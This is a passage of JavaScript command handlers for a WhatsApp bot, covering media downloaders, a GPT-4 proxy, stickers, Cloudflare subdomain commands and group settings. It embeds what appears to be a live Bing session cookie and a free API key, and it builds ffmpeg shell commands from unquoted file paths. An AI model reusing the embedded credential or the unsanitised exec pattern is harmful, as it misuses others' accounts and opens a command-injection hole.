  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
async function tiktok(url) {
	return new Promise(async (resolve, reject) => {
		const msc = await axios({
			url: "https://musicaldown.com/id",
			method: "GET",
			headers: {
				'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
			}
		})
		const a = cheerio.load(msc.data)
		let FORM = {
			[`${a("#link_url").attr("name")}`]: url,
			[`${a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(2)").attr("name")}`]: a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(2)").attr("value"),
			verify: a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(3)").attr("value")
		}
		const getPost = await axios({
			url: "https://musicaldown.com/id/download",
			method: "POST",
			headers: {
				'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
				"cookie": msc.headers["set-cookie"].join("")
			},
			data: new URLSearchParams(Object.entries(FORM))
		})

		const postmp3 = await axios({
			url: "https://musicaldown.com/id/mp3",
			method: "POST",
			headers: {
				'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
				"cookie": msc.headers["set-cookie"].join("")
			},
			data: new URLSearchParams(Object.entries(getPost))
		})

		const w = cheerio.load(getPost.data)
		const x = cheerio.load(postmp3.data)
		const FormatPost = {
			nowm: w("body > div.welcome.section > div").find("div.col.s12.l8 > a").eq(2).attr("href"),
			audio: x("a.btn.waves-effect.waves-light.orange").eq(2).attr("href")
		}
		return resolve(FormatPost)
	})
}
let tiktik = await tiktok(text)
await Klee.sendMessage(m.chat, { video: { url: tiktik.nowm }, caption: mess.success }, { quoted: m })
await Klee.sendMessage(m.chat, { audio: { url: tiktik.audio }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
case "setppbot": case "setpp": {
if (!isOwner) return KleeReply(msg.owner)
if (/image/g.test(mime)) {
let media = await Klee.downloadAndSaveMediaMessage(qmsg)
await Klee.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("Successfully Changing Bot Thumbnail Photos ✅")
} else return reply(example('by sending a photo'))}
break
case "setppbotpanjang": case "setpppanjang": {
if (!isOwner) return KleeReply(msg.owner)
if (/image/g.test(mime)) {
var medis = await Klee.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await Klee.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
reply("Successfully Changing Bot Profile Picture ✅")
} else return reply(example('by sending a photo'))
}
break
case "spotify-search": case "sps": {
    if (!text) return m.reply("Please enter a search keyword, for example: 'lazack'");
    await reply("Please wait...");
  
    const url = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
    
    fetch(url)
      .then(response => response.json())
      .then(async data => {
        if (data.length == 0) return m.reply("No results found.");
  
        let textOutput = '\n*SPOTIFY SEARCH*\n*🔎 Search Results*\n\n';
        for (let i of data) {
          textOutput += `*◦ Title:* ${i.title}
  *◦ Artist:* ${i.artist || "unknown"}
  *◦ Album:* ${i.album || "unknown"}
  *◦ Duration:* ${i.duration || "unknown"}
  *◦ Link:* ${i.url}\n\n`;
        }
        reply(textOutput);
      })
      .catch(err => m.reply("An error occurred: " + err.toString()));
  }
  break;
case 'tiktok': case "tt": { 
    if (!text) return reply(`Example : ${prefix + command} link`);
    if (!text.includes('tiktok')) return reply(`Link Invalid!!`);
    reply("lazack klee is searching..");
    
    // Menggunakan fetch untuk akses API TikTok milikmu
    fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.status !== 200) return reply('failed to get response from the api');
            
            // Mengambil URL video dan audio
        const title = `${data.result.title}\n${data.result.size}\n© Klee Dev - Lazack`
            const videoUrl = data.result.play;
            const audioUrl = data.result.music;
            
            // Mengirim video dan audio
            Klee.sendMessage(m.chat, { caption: title, video: { url: videoUrl }}, { quoted: m });
            Klee.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: m });
        })
        .catch(err => reply(err.toString()));
}
break
case "spoty-download": case "spotifydl": case "spdl":{
  
    if (!text) return m.reply('where is the link??');
    await reply ("please wait while lazack klee is searching");
    // Mengambil URL dari API download
    let apiURL = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(text)}`;
    
    try {
        // Mendapatkan data dari API
        let response = await fetch(apiURL);
        
        // Memastikan respon adalah tipe audio
        if (response.headers.get("content-type") === "audio/mpeg") {
            // Mengirim audio melalui WhatsApp
            await Klee.sendMessage(m.chat, { audio: { url: apiURL }, mimetype: 'audio/mpeg' }, { quoted: m });
        } else {
            m.reply("just an erro, use onother downloading commands");
        }
    } catch (error) {
        console.error(error);
        m.reply("error to get youre audio file");
    }
}
break
case "play2": {
    const axios = require("axios");
    if (!text) return m.reply('lol, put youre music name');

    await reply("Lazack is loading youre music...");

    try {
        // URL API untuk pencarian lagu
        const searchApiUrl = `https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`;
        const searchData = (await axios.get(searchApiUrl)).data;

        // Pilih hasil pertama dari data pencarian
        const data = searchData.data[0];
        if (!data) return reply("song not found.");

        // Teks yang akan dikirimkan
        const tekswait = `_###_ YOUTUBE PLAYER ###

- Tittle: ${data.title}
- Artist: ${data.author.name}
- URL: ${data.url}`;

        // Mengirim pesan informasi lagu
        await Klee.sendMessage(m.chat, { 
            text: `${tekswait}`, 
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: { 
                    showAdAttribution: true,
                    title: `${data.title}`,
                    body: "YOUTUBE SEARCH & DOWNLOAD",
                    thumbnailUrl: data.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            } 
        }, { quoted: qchanel });

        // URL API untuk download lagu
        const downloadApiUrl = `https://api.nexoracle.com/downloader/yt-audio?apikey=free_key@maher_apis&url=${encodeURIComponent(data.url)}`;
        const downloadData = (await axios.get(downloadApiUrl)).data;

        // Cek jika status berhasil
        if (downloadData.status === 200 && downloadData.result.audio) {
            const audioUrl = downloadData.result.audio;
            const title = downloadData.result.title || "Audio";
            const thumbnail = downloadData.result.thumb;

            // Mengirim audio melalui WhatsApp
            await Klee.sendMessage(m.chat, { 
                audio: { url: audioUrl }, 
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`,
                thumbnail: thumbnail
            }, { quoted: m });
        } else {
            m.reply("failed to get the audio file..");
        }
    } catch (error) {
        console.error(error);
        m.reply("error while lazack is downloading");
    }
}
break
case "splay": {
    const axios = require("axios");
    if (!text) return m.reply('add some text or ulr from spotify in order lazack to download youre music');

    await reply("please wait while i download...");

    try {
        // URL API untuk pencarian lagu
        const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
        const searchData = (await axios.get(searchApiUrl)).data;
        
        // Pilih hasil pertama dari data pencarian
        const data = searchData[0];
        if (!data) return reply("please just keep calm");

        // Teks yang akan dikirimkan
        const tekswait = `_###_ *SPOTIFY PLAYER* _###_

- *Tittle:* ${data.title}
- *Artist:* ${data.artist}
- *URL:* ${data.url}`;

        // Mengirim pesan informasi lagu
        await Klee.sendMessage(m.chat, { 
            text: `${tekswait}`, 
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: { 
                    showAdAttribution: true,
                    title:`${data.title}`,
                    body:"SPOTIFY SEARCH & DOWNLOAD",
                    thumbnailUrl: data.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            } 
        }, { quoted: qchanel });

        // URL API untuk download lagu
        const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
        // Mendapatkan data dari API
        let response = await fetch(downloadApiUrl);
        
        // Memastikan respon adalah tipe audio
        if (response.headers.get("content-type") === "audio/mpeg") {
            // Mengirim audio melalui WhatsApp
            await Klee.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
        } else {
            m.reply("lol, its youre music or not??");
        }
    } catch (error) {
        console.error(error);
        m.reply("failed to download youre audio");
    }
}
break
case 'play' : {
 if (!text) return reply('Enter Title / Link From YouTube!');
 await reply("Please wait...");
 try {
 	let search = require("yt-search");
let { youtube } = require("btch-downloader");
 const look = await search(text);
 const convert = look.videos[0];
 if (!convert) return reply('Video/Audio reply to download');
 if (convert.seconds >= 3600) {
 return reply(m.chat, 'Video is longer than 1 hour!');
 } else {
 let audioUrl;
 try {
 audioUrl = await youtube(convert.url);
 } catch (e) {
 reply(mess.wait)
 audioUrl = await youtube(convert.url);
 }

 await Klee.sendMessage(m.chat, {
 audio: {
 url: audioUrl.mp3
 },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: convert.title,
 body: "",
 thumbnailUrl: convert.image,
 sourceUrl: audioUrl.mp3,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 });
 }
 } catch (e) {
 reply(m.chat, `*Error:* ` + e.message);
 }
};
break
case 'ping': {
  if (!text) return m.reply(`pong 3278 ms\n\n> lazack klee dev`)
}
break
case 'gpt4': {
  if (!text) return m.reply(`Hello what should i help you?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let kanjuthann = await openai(text, "am an artificial intelligence")
m.reply(kanjuthann)
}
break
case "setnamabot": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example('teksnya'))
Klee.updateProfileName(text)
reply("successfully ✅")
}
break
case "setbio": case "setbiobot": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example('teksnya'))
Klee.updateProfileStatus(text)
reply("suuccefully bio bot ✅")
}
break
case "listdomain": {
var teks = `*List of available domains :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Example of How to Create a Subdomain :*
Type *.domain1* hostname|ipvps

*Example of how to view :* subdomains
type *.listsubdomain1*
`
reply(teks)
}
break
case "listsubdomain": case "listsubdo": {
if (!isOwner) return KleeReply(msg.owner)
if (!args[0]) return reply(example("domain1nnType *.listdomain*nTo view the list of domains"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return reply("No Subdomains")
var teks = `*🌐 LIST SUB DOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example("host|ip"))
if (!text.split("|")) return reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return reply("Hostname is invalid!, hostname only supports strip(-) or period(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "Invalid IP!" : "Fill in the server IP!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) reply(`*Subdomain successfully created ✅ *nn*Parent domain 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("domain1|subdonnTo view the listdomai type *.listdomain*"))
if (!text.split("|")) return reply(example("domain1|subdonnTo view the listdomain, type *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else return reply("Domain Not Found")
if (!sub.includes(".")) return reply("Invalid Subdomain Format!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return reply("Subdomain Not Found")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
reply(`successfully remove *${dom}* from Domain *${tldnya}*`)
}
break
case "bingimg" : {
  if (!text) throw "Input the prompt";
  await reply("Please wait...");
  try {
    const res = new Skrep.Ai.Bingimg({
      cookie: `1cB9TU7gDdnz1dfnaKIICopSXVvQRgvhwDHzcwTw8XEToMFfvYNJUlW28Bf_gKDzDEGnq9MNjOhhy0Pzl7hdhUVba7E8nYqdynD4f6N9X5gP-M6H5HHmbZ1RMibLBrImL5xl3CGawNTgbiqbxIZh9ultsr0jjjN3QLoclj8madP4I7udcheZQGcbfJrIVhV4ld4BztIv5hp6aTpfwlutmGRdOipLcTXXbnVSnm8uT-oQ`,
    });
    const data = await res.createImage(text);

    if (data.length > 0) {
      for (let i = 0; i < data.length; i++) {
        try {
          if (!data[i].endsWith(".svg")) {
            await Klee.sendMessage(m.chat, { image: {
               url: data[i]
               },
              caption:  `Image *(${i + 1}/${data.length})*\n\n*Prompt*: ${text}`,
              },
              { quoted: m });
          }
        } catch (error) {
          console.error(`Error sending file: ${error.message}`);
          await reply(`Failed to send image *(${i + 1}/${data.length})*`);
        }
      }
    } else {
      await m.reply("No images found.");
    }
  } catch (error) {
    console.error(`Error in handler: ${error.message}`);
    await m.reply(`${error}\n\n${error.message}`);
  }
}
break;
case "tts": {
if (!text) return reply(example("hello dev lazack"))
if (text.length >= 300) return reply("The number of letters must be under 300!")
reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
Klee.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return reply(e.toString())
}
}
break

case "qc": {
if (!text) return reply(example('dev danny'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return reply("Error")
await Klee.sendStimg(m.chat, tempnya, m, {packname: namabot})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break


case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return reply("Maximum video duration is 30 seconds!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
Klee.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return reply(example("by sending/replying to videos"))
}
}
break
case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return reply(example('please reply to a steacker'))
reply(msg.wait)
let media = await Klee.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
Klee.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {
if (!/video|audio/.test(mime) && !/audio/.test(mime)) return reply(example('reply to audio or video'))
reply(msg.wait)
await Klee.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
Klee.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(example('reply to video'))
if ((qmsg).seconds > 30) return reply("duration only for 30 sec")
reply(msg.wait)
await Klee.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
Klee.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("reply to a photo or video"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("video should be 5 second only")
}
reply(msg.wait)
var media = await Klee.downloadAndSaveMediaMessage(qmsg)
await Klee.sendStimg(m.chat, media, m, {packname: global.packname})
await fs.unlinkSync(media)
}
break
case "tourl": {
if (!/image/.test(mime)) return reply(example("please reply to a photo"))
await reply(msg.wait)
var fotonya = await Klee.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
await reply(`Link Tautan :\n${urlimage}`)
await fs.unlinkSync(fotonya)
}
break
case "public": {
if (!isOwner) return KleeReply(msg.owner)
Klee.public = true
reply("Successfully switching bot mode to *Public*")
}
break
case "self": {
if (!isOwner) return KleeReply(msg.owner)
Klee.public = false
reply("Successfully swithing bot mode to *Self*")
}
break
case "get": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply("link please")
try {
var check = await fetchJson(text)
reply(JSON.stringify(check, null, 2))
} catch (e) {
return reply(e.toString())
}}
break



case "mediafire": {
if (!text) return reply(example("link"))
if (!text.includes('mediafire.com')) return reply("Link is valid!")
reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return reply("Failed to download, file size too large")
if (res.filesize.split("MB")[0] >= 100) return reply("Failed to download, file size too large")
if (res.url == "") return reply(mess.error)
Klee.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "Download Berhasil ✅"}, {quoted: m})
}).catch((e) => reply(e.toString()))
}
break
case "pinterest": case "pin": {
if (!text) return reply(example("tobrut"))
reply(msg.wait)
await pinterest(text).then((res) => {
if (res.length < 1) return reply("Error, Photo Not Found")
let jumlah = 5
if (res.length < jumlah) jumlah = res.length
for (let e = 0; e < jumlah; e++) {
Klee.sendMessage(m.chat, {image: {url: res[e]}, caption: "Done Bang ✅"}, {quoted: m})
}
}).catch(e => reply(e.toString()))
}
break
case 'readmore': {
            const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    Klee.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break

case "owner": {
Klee.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/owner.jpg"), 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break
case "antilink": {
if (!isGroup) return KleeReply(msg.group)
if (!isOwner && !isAdmin) return KleeReply(msg.admin)
if (!args[0]) return reply(example("on/off\n\nType *.statusgc* to view the status of this group's settings"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return reply("*Antilink* in this group is active!nnType *.statusgc* to see the status of this group's settings")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
reply("Successfully turn on *antilink* in this ✅ group nnType *.statusgc* to view the setting status of this group")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return reply("*Antilink* in this group is not active yet!\nType *.statusgc* to view the settings status of this group")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
reply("Successfully turn off *antilink* in this ❌ group nnType *.statusgc* to view the setting status of this group")
} else {
return reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {
if (!isGroup) return KleeReply(msg.group)
if (!isOwner && !isAdmin) return KleeReply(msg.owner)
if (!args[0]) return reply(example("on/offnnType *.statusgc* to view the status of this group's settings"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return reply("*AntilinkV2* in this group is active!nnType *.statusgc* to see the status of this group's settings")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
reply("Successfully turn on *AntilinkV2* in this ✅ group \n\nType *.statusgc* To view the status of this group's settings")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return reply("*AntilinkV2* in this group is not active yet!nnType *.statusgc* to view the status of this group's settings")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
reply("Successfully turn off *antilink* in this ❌ group Type *.statusgc* To view the status of this group's settings")
} else {
return reply(example("on/off"))
}}
break
case "welcome": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example("on/off\n\nType *.statusbot* to view the bot settings status"))
if (text.toLowerCase() == "on") {
if (welcome) return reply("*Welcome* Already Active!\n\nType *.statusbot* to view the bot settings status")
welcome = true
reply("Successfully Igniting *Welcome ✅*\n\nType *.statusbot* to view the bot settings status")
} else if (text.toLowerCase() == "off") {
if (!welcome) return reply("*Welcome*  disactive!\n\nType *.statusbot* to view the bot settings status")
welcome = false
reply("Successfully Shutting Down *Welcome ❌*\n\nType *.statusbot* to view the bot settings status")
} else {
return reply(example("on/off\n\nType *.statusbot* to view the bot settings status"))
}}
break
case "autoread": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example("on/off\n\nType *.statusbot* to view the bot settings status"))
if (text.toLowerCase() == "on") {
if (autoread) return reply("*Autoread* active!\n\nType *.statusbot* to view the bot settings status")
autoread = true
reply("Successfuly turned *Autoread ✅*\n\nType *.statusbot* to view the bot settings status")
} else if (text.toLowerCase() == "off") {
if (!autoread) return reply("*Autoread* disable!\n\nType *.statusbot* to view the bot settings status")
autoread = false
reply("Successfully turned off *Autoread ❌*\n\nType *.statusbot* to view the bot settings status")
} else {
return reply(example("on/off\n\nType *.statusbot* to view the bot settings status"))
}}
break
case "anticall": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example("on/off\n\nType *.statusbot* to view the bot settings status"))
if (text.toLowerCase() == "on") {
if (anticall) return reply("*Anticall*\n\nType *.statusbot* to view the bot settings status")
anticall = true
reply("succfully turned *Anticall ✅*\n\nType *.statusbot* to view the bot settings status")
} else if (text.toLowerCase() == "off") {
if (!anticall) return reply("*Anticall* Inactive!\n\nType *.statusbot* to view the bot settings status")
anticall = false
reply("Successfully Shutting Down *Anticall ❌*\n\nType *.statusbot* to view the bot settings status")
} else {
return reply(example("on/off\n\nType *.statusbot* to view the bot settings status"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {
if (!isOwner) return KleeReply(msg.owner)
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*active ✅*" : "*turned off ❌*"}
* Anticall : ${global.anticall ? "*active ✅*" : "*Turned off ❌*"}
* Welcome : ${global.welcome ? "*active ✅*" : "*Turned off ❌*"}

*Examples of :* Usage
Tap *.autoread* on/off`
reply(teks)
}
break
case "statusgc": {
if (!isGroup) return KleeReply(msg.group)
if (!isOwner && !isAdmin) return KleeReply(msg.admin)
var anti1 = "Active ✅"
var anti2 = "Active ✅"
if (!antilink2.includes(m.chat)) anti2 = "Turned off ❌"
if (!antilink.includes(m.chat)) anti1 = "Turned off ❌"
var teks = `
*List Status Group Settings :*

* Antilink : *${anti1}*
* AntilinkV2 : *${anti2}*

*example of usage:*
type *.antilink* on/off
`
Klee.senText(m.chat, teks, qchanel)
}
break
case "setppgc": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (/image/g.test(mime)) {
let media = await Klee.downloadAndSaveMediaMessage(qmsg)
await Klee.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
reply("Successfully Changing Group Profiles")
} else return reply(example('by sending a photo'))}
break
case "setnamegc": case "setnamagc": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!text) return reply(example('teksnya'))
const gcname = metadata.subject
await Klee.groupUpdateSubject(m.chat, text)
reply(`Successfully renaming a group *${gcname}* Menjadi *${text}*`)
}
break
case "approve":
          if (!text)
            return m.reply(
              "Please enter the name of the clan you want to view.",
            );
          let approveGroup = Object.values(group).find(
            (c) => c.clan === text,
          );
          if (!approveGroup) return m.reply("Clan not found.");

          if (approveGroup.owner !== sender.replace("@s.whatsapp.net", ""))
            return m.reply(
              "You do not have permission to approve join requests.",
            );

          if (
            !approveGroup.joinRequests ||
            approveGroup.joinRequests.length === 0
          )
            return m.reply(
              "There are no join requests pending approval.",
            );

              let approveText = "";

              if (!text === "all") {
                let approvedMembers = [];
                approveGroup.joinRequests.forEach((request) => {
                  targetJoinGroup.members.push({
                    id: request.id,
                    number: approveGroup.members.length + 1,
                    sesi: chat,
                    status: false,
                    group: request.group,
                    vote: 0,
                  });
                  approvedMembers.push(request.id);
approveText += `Join request from @${request.id.replace("@s.whatsapp.net", "")} has been approved.\n`;
});
approveGroup.joinRequests = [];
writeGroup(group);
} else if (text) {
  let index = parseInt(text) - 1;
  if (
    isNaN(index) ||
    index < 0 ||
    index >= approveGroup.joinRequests.length
  )
    return m.reply("Invalid index number.");

  let requester = approveGroup.joinRequests[index];
  approveGroup.joinRequests.splice(index, 1);
  approveGroup.members.push({
    id: requester.id,
    number: approveGroup.members.length + 1,
    session: chat,
    status: false,
    group: requester.group,
    vote: 0,
  });
  approveText = `Join request from @${requester.id.replace("@s.whatsapp.net", "")} has been approved.`;
  writeGroup(group);
} else {
  let pendingRequestsText = `Please specify whether you want to approve all join requests (all) or a specific user's request.\n\n`;
  pendingRequestsText += "*List of Join Requests:*\n";
  approveGroup.joinRequests.forEach((request, index) => {
